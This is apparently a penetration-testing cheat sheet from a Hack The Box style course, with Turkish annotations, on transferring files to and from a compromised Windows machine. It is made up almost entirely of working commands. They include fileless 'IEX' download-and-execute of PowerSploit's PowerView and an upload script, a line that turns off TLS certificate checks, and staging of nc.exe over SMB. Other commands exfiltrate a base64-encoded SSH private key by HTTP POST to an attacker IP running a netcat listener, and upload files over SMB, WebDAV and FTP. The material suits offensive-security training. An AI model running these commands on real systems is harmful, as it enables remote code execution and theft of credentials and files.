# Windows File Transfer Methods

## Download Operations

### PowerShell Decode (Base64)

!!! warning

    Bu yöntem büyük dosyalar için kullanılamaz.

#### Encode on Linux

```sh
my@attack:~$ cat id_rsa | base64 -w 0
```

```output title="Output"
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

#### Decode on Windows

```pwsh
PS C:\Users\htb-student> [System.IO.File]::WriteAllBytes("id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```

#### Compare Linux and Windows Checksums

=== "LINUX"

    ```sh
    my@attack:~$ md5sum id_rsa
    ```

    ```output title="Output"
    4e301756a07ded0a2dd6953abf015278  id_rsa
    ```

=== "WINDOWS"

    ```pwsh
    PS C:\Users\htb-student> Get-FileHash "id_rsa" -Algorithm MD5 | Select-Object -ExpandProperty hash
    ```

    ```output title="Output"
    4E301756A07DED0A2DD6953ABF015278
    ```

### PowerShell [DownloadFile](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-8.0)

```pwsh
PS C:\Users\htb-student> (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1", "PowerView.ps1")
```

### PowerShell [DownloadFileAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-8.0)

```pwsh
PS C:\Users\htb-student> (New-Object System.Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1", "PowerView.ps1")
```

### PowerShell [Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4)

```pwsh
PS C:\Users\htb-student> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1" -OutFile "PowerView.ps1"
```

### PowerShell [Invoke-Expression](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4) (Fileless Method)

```pwsh
PS C:\Users\htb-student> IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1")
```

### Common Errors with PowerShell

#### Internet Explorer First Run Wizard

```pwsh
PS C:\Users\htb-student> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1" -UseBasicParsing | IEX
```

#### Certificate Validation

```pwsh
PS C:\Users\htb-student> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads

Linux üzerinde bir SMB sunucusu başlat:

```sh
my@attack:~$ sudo smbserver.py -smb2support share /tmp
```

Sunucuda bulunan bir dosyayı Windows bilgisayarına indir:

```pwsh
PS C:\Users\htb-student> cmd.exe /c copy \\172.29.59.148\share\nc.exe .
```

### SMB Downloads (Credentialed)

Linux üzerinde bir SMB sunucusu başlat:

```sh
my@attack:~$ sudo smbserver.py -smb2support share /tmp -user test -password test
```

Sunucuyu Windows üzerinde mount et:

```pwsh
PS C:\Users\htb-student> net use N: \\172.29.59.148\share /user:test test
```

Sunucuda bulunan bir dosyayı Windows bilgisayarına indir:

```pwsh
PS C:\Users\htb-student> cmd.exe /c copy N:\nc.exe .
```

### FTP Downloads

Gerekli Python paketlerini yükle:

```sh
my@attack:~$ sudo pip3 install pyftpdlib
```

Linux üzerinde bir FTP sunucusu başlat:

```sh
my@attack:~$ sudo python3 -m pyftpdlib -p 21
```

Sunucuda bulunan bir dosyayı Windows bilgisayarına indir:

```pwsh
PS C:\Users\htb-student> (New-Object System.Net.WebClient).DownloadFile("ftp://172.29.59.148:21/file.txt", "file.txt")
```

Süreci otomatik hale getirmek için bir FTP komut dosyası oluştur:

```text title="command.txt" linenums="1" hl_lines="4"
OPEN 172.29.59.148
USER anonymous
BINARY
GET file.txt
BYE
```

Sunucuda bulunan bir dosyayı Windows bilgisayarına indir:

```pwsh
PS C:\Users\htb-student> ftp.exe -v -n -s:command.txt
```

## Upload Operations

### PowerShell Encode (Base64)

#### Encode on Windows

```pwsh
PS C:\Users\htb-student> [Convert]::ToBase64String((Get-Content -Path "id_rsa" -AsByteStream))
```

```pwsh
PS C:\Users\htb-student> [Convert]::ToBase64String((Get-Content -Path "id_rsa" -Raw -Encoding Byte))
```

```output title="Output"
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

#### Decode on Linux

```sh
my@attack:~$ echo -n LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo= | base64 -d > id_rsa
```

#### Compare Windows and Linux Checksums

=== "WINDOWS"

    ```pwsh
    PS C:\Users\htb-student> Get-FileHash "id_rsa" -Algorithm MD5 | Select-Object -ExpandProperty hash
    ```

    ```output title="Output"
    4E301756A07DED0A2DD6953ABF015278
    ```

=== "LINUX"

    ```sh
    my@attack:~$ md5sum id_rsa
    ```

    ```output title="Output"
    4e301756a07ded0a2dd6953abf015278  id_rsa
    ```

### PowerShell Upload (Web)

Gerekli Python paketlerini yükle:

```sh
my@attack:~$ sudo pip3 install uploadserver
```

Yükleme işlemini destekleyen bir web sunucusu başlat:

```sh
my@attack:~$ python3 -m uploadserver 8000
```

[PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) modülünü fileless yöntemi ile çalıştır:

```pwsh
PS C:\Users\htb-student> IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1")
```

Windows bilgisayarında bulunan bir dosyayı sunucuya yükle:

```pwsh
PS C:\Users\htb-student> Invoke-FileUpload -Uri "http://172.29.59.148:8000/upload" -File "file.txt"
```

### PowerShell Upload (Base64)

#### Start a Listener on Linux

```sh
my@attack:~$ nc -lvnp 8000
```

#### Send Data from Windows

```pwsh
PS C:\Users\htb-student> Invoke-WebRequest -Uri "http://172.29.59.148:8000" -Method POST -Body ([Convert]::ToBase64String((Get-Content -Path "id_rsa" -AsByteStream)))
```

```pwsh
PS C:\Users\htb-student> Invoke-WebRequest -Uri "http://172.29.59.148:8000" -Method POST -Body ([Convert]::ToBase64String((Get-Content -Path "id_rsa" -Raw -Encoding Byte)))
```

### SMB Uploads

Linux üzerinde bir SMB sunucusu başlat:

```sh
my@attack:~$ sudo smbserver.py -smb2support share /tmp
```

Windows bilgisayarında bulunan bir dosyayı sunucuya yükle:

```pwsh
PS C:\Users\htb-student> cmd.exe /c copy file.txt \\172.29.59.148\share
```

### SMB Uploads (WebDAV)

!!! abstract

    Giden bağlantıların kısıtlandığı bir ortamda HTTP [WebDAV](https://datatracker.ietf.org/doc/html/rfc4918) eklentisi ile HTTP/HTTPS üzerinden SMB protokolü çalıştırılabilir.

Gerekli Python paketlerini yükle:

```sh
my@attack:~$ sudo pip3 install wsgidav cheroot
```

Linux üzerinde bir WebDAV sunucusu başlat:

```sh
my@attack:~$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

DavWWWRoot gerçekte olmayan, ancak Windows tarafından tanınan bir anahtar kelimedir.

DavWWWRoot dizinini Windows üzerinde mount et:

```pwsh
PS C:\Users\htb-student> net use N: \\172.29.59.148\DavWWWRoot
```

Windows bilgisayarında bulunan bir dosyayı sunucuya yükle:

```pwsh
PS C:\Users\htb-student> cmd.exe /c copy file.txt N:\
```

### FTP Uploads

Linux üzerinde bir FTP sunucusu başlat:

```sh
my@attack:~$ sudo python3 -m pyftpdlib -p 21 --write
```

Windows bilgisayarında bulunan bir dosyayı sunucuya yükle:

```pwsh
PS C:\Users\htb-student> (New-Object System.Net.WebClient).UploadFile("ftp://172.29.59.148:21/file.txt", "file.txt")
```

Süreci otomatik hale getirmek için bir FTP komut dosyası oluştur:

```text title="command.txt" linenums="1" hl_lines="4"
OPEN 172.29.59.148
USER anonymous
BINARY
PUT file.txt
BYE
```

Windows bilgisayarında bulunan bir dosyayı sunucuya yükle:

```pwsh
PS C:\Users\htb-student> ftp.exe -v -n -s:command.txt
```
